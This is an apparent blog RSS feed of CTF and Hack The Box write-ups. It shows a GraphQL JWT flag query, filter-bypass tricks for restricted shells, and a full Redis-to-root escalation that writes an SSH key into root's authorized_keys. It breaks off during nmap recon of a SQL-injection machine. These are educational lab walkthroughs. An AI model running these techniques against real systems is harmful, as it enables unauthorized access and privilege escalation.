<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;authenticateUser&#34;</span><span class="p">:{</span><span class="nt">&#34;token&#34;</span><span class="p">:</span><span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIzNDIzNjUsImlhdCI6MTYzMjE2OTU2NSwiaXNzIjoiQ29uZ29uNHRvciJ9.2huNUpNe3_vIkAwIcYxKeLbJfnmyugX3GydGD9prJiY&#34;</span><span class="p">}}}</span>
</code></pre></div><p>Now I could query the flag with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/graphql</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="n">Host</span><span class="o">:</span> <span class="l">challenge.ctf.games:30013</span>
<span class="err">...[SNIP]...</span>
<span class="g">content-type: application/json
</span><span class="g">Origin: http://challenge.ctf.games:32347
</span><span class="g">Content-Length: 23
</span><span class="g">Connection: close
</span><span class="g">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNob3JvcHlzIiwiZXhwIjoxNjMyMDYzNDEyLCJpYXQiOjE2MzE4OTA2MTIsImlzcyI6IkNvbmdvbjR0b3IifQ.mXLkQDZ5Oum3Bq8A4ZFHyNX9QmS0qhcBR8ph0-WfxmI
</span><span class="g">Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNvbmdvbjR0b3IiLCJleHAiOjE2MzIzNDIzNjUsImlhdCI6MTYzMjE2OTU2NSwiaXNzIjoiQ29uZ29uNHRvciJ9.2huNUpNe3_vIkAwIcYxKeLbJfnmyugX3GydGD9prJiY
</span><span class="g">
</span><span class="g">{
</span><span class="g">&#34;query&#34;:&#34;{flag}&#34;
</span><span class="g">}
</span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json; charset=utf-8</span>
<span class="n">Date</span><span class="o">:</span> <span class="l">Fri, 17 Sep 2021 20:17:24 GMT</span>
<span class="n">Content-Length</span><span class="o">:</span> <span class="l">53</span>
<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;flag&#34;</span><span class="p">:</span><span class="s2">&#34;flag{9d26b6e4a765ecd87fe03a1494c22236}&#34;</span><span class="p">}}</span>
</code></pre></div><h2 id="references">References</h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">https://github.com/swisskyrepo/PayloadsAllTheThings/</a></li>
<li><a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>H@cktivitycon 2021 CTF - Miscellaneous</title>
      <link>https://fahmifj.github.io/ctf/hacktivitycon-2021-misc/</link>
      <pubDate>Mon, 04 Oct 2021 02:50:12 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hacktivitycon-2021-misc/</guid>
      <description>This is my late writeups for H@cktivitycon 2021 miscellaneous category.</description>
      <content:encoded><![CDATA[<p>So, in mid September 2021, I participated in the H@cktivitycon 2021 CTF. The event was hosted by HackerOne and lasted for two days.</p>
<p>A bit late but in this post, I&rsquo;ll share my writeups/solutions for three Miscellaneous category challenges that I solved.</p>
<p>I signed up earlier but only played the main challenges in the last few hours, which I now regret because there were so many fantastic challenges ðŸ˜…ðŸ”¨</p>
<h2 id="easy">Easy</h2>
<h3 id="badwords">Badwords</h3>
<h4 id="description">Description</h4>
<blockquote>
<p>You look questionable&hellip; if you don&rsquo;t have anything good to say, don&rsquo;t say anything at all!</p>
</blockquote>
<h4 id="walkthrough">Walkthrough</h4>
<p>When connecting, I can assume that it&rsquo;s not in a proper TTY, maybe a kind of wrapper shell. Each command I sent returns with the same message telling that it was a bad word.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc -v challenge.ctf.games <span class="m">32559</span>
Connection to challenge.ctf.games <span class="m">32559</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>-1<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
user@host:/home/user$ ls -l
ls -l
You said a bad word, <span class="s2">&#34;l&#34;</span>!!
user@host:/home/user$ <span class="nb">echo</span> <span class="nv">$0</span>
<span class="nb">echo</span> <span class="nv">$0</span>
You said a bad word, <span class="s2">&#34;echo&#34;</span>!!
</code></pre></div><p>But if I send a command separator, it returns a syntax error (notice the <code>;'</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="p">;</span>ls
<span class="p">;</span>ls
bash: syntax error near unexpected token <span class="sb">`</span><span class="p">;</span><span class="err">&#39;</span>
user@host:/home/user$
</code></pre></div><p>Now if I send a command enclosed with a single quote, I get the expected results.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;whoami&#39;</span>
<span class="s1">&#39;whoami&#39;</span>
user
</code></pre></div><p>And adding an arg returns a different error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls -l&#39;</span>
<span class="s1">&#39;ls -l&#39;</span>
bash: ls -l: <span class="nb">command</span> not found
</code></pre></div><p>But if I separate the args, it returns with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span>
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 just
</code></pre></div><p>Now I can just do a recursive <code>ls</code> to find the flag and read it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@host:/home/user$ <span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
<span class="s1">&#39;ls&#39;</span> <span class="s1">&#39;-l&#39;</span> <span class="s1">&#39;-R&#39;</span> <span class="s1">&#39;just&#39;</span>
just:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 out

just/out:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 of

just/out/of:
total <span class="m">4</span>
drwxr-xr-x <span class="m">1</span> user user <span class="m">4096</span> Sep  <span class="m">9</span> 19:47 reach

just/out/of/reach:
total <span class="m">4</span>
-rw-r--r-- <span class="m">1</span> user user <span class="m">38</span> Sep  <span class="m">9</span> 19:47 flag.txt
user@host:/home/user$ <span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
<span class="s1">&#39;cat&#39;</span> <span class="s1">&#39;just/out/of/reach/flag.txt&#39;</span>
flag<span class="o">{</span>2d43e30a358d3f30fe65cc47a9cbbe98<span class="o">}</span>user@host:/home/user$
</code></pre></div><h2 id="medium">Medium</h2>
<h3 id="shelle">Shelle</h3>
<h4 id="description-1">Description</h4>
<blockquote>
<p>Professor Shelle created a custom psuedo shell for us to learn Linux,  she believes it&rsquo;s safe and no one can ever read the flag. Can you prove  her wrong?*</p>
</blockquote>
<h4 id="walkthrough-1">Walkthrough</h4>
<p>This challenge is another shell wrapper like badwords. Upon connected, I was provided with the following menu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ rlwrap nc challenge.ctf.games <span class="m">32217</span>

Welcome to Shelle, a custom psuedo shell utility created by Professor Shelle in order to teach students about Linux terminals
Shelle is a restricted environment to prevent any misuse, Please Enter <span class="s1">&#39;HELP&#39;</span> to know about available features, happy learning !

root@pshelle$ HELP
HELP

Here is the list of <span class="nb">command</span> availiable to Students
1&gt; whoami
2&gt; <span class="nb">pwd</span>
3&gt; ls
4&gt; ps
5&gt; id
6&gt; <span class="nb">echo</span>
7&gt; cat


root@shelle$
</code></pre></div><p>When I use the <code>ls</code> command, I didn&rsquo;t find any flag in the current working directory. It seems I have to find it somewhere in this machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls
ls
assignment.txt  bin
</code></pre></div><p>So the first thing I tried was to list the root directory with <code>ls -l /</code>, but it turned out some characters, including <code>/</code>, are flagged as illegal. Luckily, <code>$</code>, <code>(</code>, <code>)</code>, <code>&quot;</code>, and <code>\</code> are not, so I can use the <code>echo</code> command with <code>-e</code> option within a subshell to print <code>\x2f</code> which is a <code>/</code> in Hex form.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2f&#34;</span><span class="k">)</span>
bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
</code></pre></div><p>After wandering around, I found the flag on <code>/opt/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@shelle$ ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
ls <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt&#34;</span><span class="k">)</span> -lt
total <span class="m">24</span>
-rwxr-xr-x <span class="m">1</span> shelle shelle <span class="m">17312</span> Sep  <span class="m">9</span> 19:33 binary
-r--r--r-- <span class="m">1</span> root   root      <span class="m">38</span> Sep  <span class="m">9</span> 19:33 flag.txt

root@shelle$ cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
cat <span class="k">$(</span><span class="nb">echo</span> -e <span class="s2">&#34;\x2fopt\x2fflag.txt&#34;</span><span class="k">)</span>
flag<span class="o">{</span>82ad133488ad326eaf2120e03253e5d7<span class="o">}</span>
</code></pre></div><blockquote>
<p><strong>Note</strong>: I added a space after the shell prompt for readability and syntax highlighting.</p>
</blockquote>
<h3 id="redlike">Redlike</h3>
<h4 id="description-2">Description</h4>
<blockquote>
<p>You know, I like the color red. Primary colors are the best colors &ndash; you can do so much with them!</p>
<p>Escalate your privileges and retrieve the flag out of <code>root</code>&rsquo;s home directory.</p>
</blockquote>
<h4 id="walkthrough-2">Walkthrough</h4>
<p>For this challenge, there was a set of credentials given for SSH login into a VM instance.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">iamf@ubuntu:~$ ssh -p <span class="m">31464</span> user@challenge.ctf.games
user@challenge.ctf.games<span class="s1">&#39;s password:
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user@redlike-a6548218fe17631b-b75878d5-qsl75:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
</code></pre></div><p>At the root directory, I found <code>.docker-entrypoint</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -lah
total 72K
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 .
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 ..
-rwxr-xr-x    <span class="m">1</span> root root   <span class="m">61</span> Sep <span class="m">16</span> 14:43 .docker-entrypoint
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 bin -&gt; usr/bin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Apr <span class="m">15</span>  <span class="m">2020</span> boot
drwxr-xr-x    <span class="m">5</span> root root  <span class="m">360</span> Sep <span class="m">18</span> 11:34 dev
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 etc
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:43 home
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">7</span> Aug <span class="m">27</span> 07:16 lib -&gt; usr/lib
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib32 -&gt; usr/lib32
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">9</span> Aug <span class="m">27</span> 07:16 lib64 -&gt; usr/lib64
lrwxrwxrwx    <span class="m">1</span> root root   <span class="m">10</span> Aug <span class="m">27</span> 07:16 libx32 -&gt; usr/libx32
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 media
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 mnt
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 opt
dr-xr-xr-x <span class="m">2595</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:34 proc
drwx------    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 root
drwxr-xr-x    <span class="m">1</span> root root 4.0K Sep <span class="m">18</span> 11:34 run
lrwxrwxrwx    <span class="m">1</span> root root    <span class="m">8</span> Aug <span class="m">27</span> 07:16 sbin -&gt; usr/sbin
drwxr-xr-x    <span class="m">2</span> root root 4.0K Aug <span class="m">27</span> 07:16 srv
dr-xr-xr-x   <span class="m">12</span> root root    <span class="m">0</span> Sep <span class="m">18</span> 11:33 sys
drwxrwxrwt    <span class="m">1</span> root root 4.0K Sep <span class="m">16</span> 14:44 tmp
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:16 usr
drwxr-xr-x    <span class="m">1</span> root root 4.0K Aug <span class="m">27</span> 07:27 var
</code></pre></div><p>Based on the contents of the file and the name of the challenge, it&rsquo;s clear that the privesc has something to do with Redis.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ cat .docker-entrypoint
<span class="c1">#!/bin/bash</span>

/etc/init.d/redis-server start
/usr/sbin/sshd -D
</code></pre></div><p>I can connect to the Redis server using <code>redis-cli</code> without authentication. I started the enumeration by sending <code>INFO</code> command, but under <code># Keyspace</code>, I found no active database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ which redis-cli
/usr/bin/redis-cli
user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ redis-cli
127.0.0.1:6379&gt; INFO
<span class="c1"># Server</span>
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:636cde3b5c7a3923
redis_mode:standalone
os:Linux 5.4.120+ x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.2.1
process_id:15
run_id:f5d6504f95159db85bb78e1bd786b2f3171564fd
tcp_port:6379
uptime_in_seconds:344
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:4575234
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

<span class="c1"># Clients</span>
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

<span class="c1"># Memory</span>
used_memory:859152
used_memory_human:839.02K
used_memory_rss:6017024
used_memory_rss_human:5.74M
used_memory_peak:859152
used_memory_peak_human:839.02K
used_memory_peak_perc:100.12%
used_memory_overhead:845926
used_memory_startup:796232
used_memory_dataset:13226
used_memory_dataset_perc:21.02%
allocator_allocated:1575864
allocator_active:1847296
allocator_resident:9879552
total_system_memory:33678073856
total_system_memory_human:31.37G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.17
allocator_frag_bytes:271432
allocator_rss_ratio:5.35
allocator_rss_bytes:8032256
rss_overhead_ratio:0.61
rss_overhead_bytes:-3862528
mem_fragmentation_ratio:7.36
mem_fragmentation_bytes:5199880
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

<span class="c1"># Persistence</span>
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1631964842
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

<span class="c1"># Stats</span>
total_connections_received:1
total_commands_processed:1
instantaneous_ops_per_sec:0
total_net_input_bytes:31
total_net_output_bytes:11468
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

<span class="c1"># Replication</span>
role:master
connected_slaves:0
master_replid:f4b741e04432090f4eba3ef1fbdb2ce11e405aeb
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

<span class="c1"># CPU</span>
used_cpu_sys:0.271186
used_cpu_user:0.278797
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

<span class="c1"># Cluster</span>
cluster_enabled:0

<span class="c1"># Keyspace</span>
127.0.0.1:6379&gt;
</code></pre></div><p>The next thing I tried was writing a file to <code>/tmp</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1:6379&gt; config <span class="nb">set</span> dir /tmp
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename choropys.php
OK
127.0.0.1:6379&gt; <span class="nb">set</span> <span class="nb">test</span> <span class="s2">&#34;choropys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>I exited from <code>redis-cli</code> and immediately checked the file I wrote under <code>/tmp</code>. It&rsquo;s there and the owner is root!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-a6548218fe17631b-b75878d5-qsl75:/$ ls -l /tmp/choropys.php
-rw-rw---- <span class="m">1</span> root root <span class="m">112</span> Sep <span class="m">18</span> 11:45 /tmp/choropys.php
</code></pre></div><p>This arbitrary file write lack the execute permissions, but I remember from Hack The Box Postman that it is possible to use this to overwite the SSH <code>authorized_keys</code> file (see <a href="https://0xdf.gitlab.io/2020/03/14/htb-postman.html">this writeup</a> by 0xdf). So I can try to ovewrite the root&rsquo;s <code>authorized_keys</code> file.</p>
<p>First, I need to generate a pair of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ mkdir .ssh
user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key <span class="o">(</span>/home/user/.ssh/id_rsa<span class="o">)</span>:
Enter passphrase <span class="o">(</span>empty <span class="k">for</span> no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved in /home/user/.ssh/id_rsa
Your public key has been saved in /home/user/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:AVk3h1vdyP/x1KCcBr/IQY7eac9vzZUUrMx/pNkB0KI user@redlike-20edff3e85f553f2-55b895664b-szch7
The key<span class="err">&#39;</span>s randomart image is:
+---<span class="o">[</span>RSA 3072<span class="o">]</span>----+
<span class="p">|</span>      .o. oo+o.o <span class="p">|</span>
<span class="p">|</span>      .. .++.o<span class="o">=</span>o.<span class="p">|</span>
<span class="p">|</span>        .+.*+oooo<span class="p">|</span>
<span class="p">|</span>        .E+ *+ +<span class="o">=</span><span class="p">|</span>
<span class="p">|</span>       .So <span class="o">=</span> .o**<span class="p">|</span>
<span class="p">|</span>        . * . oo*<span class="p">|</span>
<span class="p">|</span>         . o   oo<span class="p">|</span>
<span class="p">|</span>            o . o<span class="p">|</span>
<span class="p">|</span>             o.  <span class="p">|</span>
+----<span class="o">[</span>SHA256<span class="o">]</span>-----+
</code></pre></div><p>Then I will have to wrap the SSH public key with two extra newlines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ <span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; spaced_key.txt
</code></pre></div><p>Now the key can be stored in Redis using the following command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ cat spaced_key.txt <span class="p">|</span> redis-cli -x <span class="nb">set</span> spaced_key.txt
OK
</code></pre></div><p>Then I can just set the database file name to  <code>authorized_keys</code> and save that under <code>/root/.ssh/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ redis-cli
127.0.0.1:6379&gt; config <span class="nb">set</span> dir /root/.ssh
OK
127.0.0.1:6379&gt; config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
OK
127.0.0.1:6379&gt; save
OK
127.0.0.1:6379&gt;
</code></pre></div><p>And it worked, I can SSH login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">user@redlike-20edff3e85f553f2-55b895664b-szch7:~$ ssh root@redlike-20edff3e85f553f2-55b895664b-szch7
The authenticity of host <span class="s1">&#39;redlike-20edff3e85f553f2-55b895664b-szch7 (10.112.8.36)&#39;</span> can<span class="s1">&#39;t be established.
</span><span class="s1">ECDSA key fingerprint is SHA256:m9vzgGyWcCXB1tg0uLHYCKCaDNZFUnbeSirAvvLkYxU.
</span><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span class="s1">Warning: Permanently added &#39;</span>redlike-20edff3e85f553f2-55b895664b-szch7,10.112.8.36<span class="s1">&#39; (ECDSA) to the list of known hosts.
</span><span class="s1">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.120+ x86_64)
</span><span class="s1">
</span><span class="s1"> * Documentation:  https://help.ubuntu.com
</span><span class="s1"> * Management:     https://landscape.canonical.com
</span><span class="s1"> * Support:        https://ubuntu.com/advantage
</span><span class="s1">
</span><span class="s1">This system has been minimized by removing packages and content that are
</span><span class="s1">not required on a system that users do not log into.
</span><span class="s1">
</span><span class="s1">To restore this content, you can run the &#39;</span>unminimize<span class="err">&#39;</span> command.

The programs included with the Ubuntu system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@redlike-20edff3e85f553f2-55b895664b-szch7:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# ls -l
total <span class="m">4</span>
--w------- <span class="m">1</span> root root <span class="m">39</span> Sep <span class="m">16</span> 14:43 flag.txt
root@redlike-20edff3e85f553f2-55b895664b-szch7:~# cat flag.txt
flag<span class="o">{</span>69dc14707af23b728ebd1363715ec890<span class="o">}</span>
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Validation</title>
      <link>https://fahmifj.github.io/hackthebox/validation/</link>
      <pubDate>Fri, 24 Sep 2021 19:11:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/validation/</guid>
      <description>Second-order SQL injection</description>
      <content:encoded><![CDATA[<p><a href="https://app.hackthebox.eu/machines/Validation">Validation</a>  is a machine from the UHC September qualifiers and is currently live on Hack The Box as a retired machine. It starts with enumeration on a website and identifying a second order SQL injection. The SQL user can use various SQL functions, two of which allow for file read and file write. The web configuration, which contains database credentials, can be read using the file read ability. With the file write ability and also write permission on the web root, it is possible to drop a web shell to gain a foothold on the system. For the root part, the password for the database is found to be re-used by the root account.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SQL injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All TCP ports scan with <code>nmap</code> discovers 4 open ports: SSH on 22, three web servers on 80, 4566 (probably LocalStack), and 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">â†’ kali@kali Â«validationÂ» Â«10.10.14.5Â» 
$ fscan 10.10.11.116 validation
nmap -p- 10.10.11.116 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
nmap -p 22,80,4566,5000,5001,5002,5003,5004,5005,5006,5007,5008,8080 -sC -sV -oA nmap/all-tcp-ports-validation 10.10.11.116
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-22 16:46 EDT
Nmap scan report <span class="k">for</span> 10.10.11.116
Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">3072</span> d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open     http           Apache httpd 2.4.48 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.48 <span class="o">(</span>Debian<span class="o">)</span>
<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
4566/tcp open     http           nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
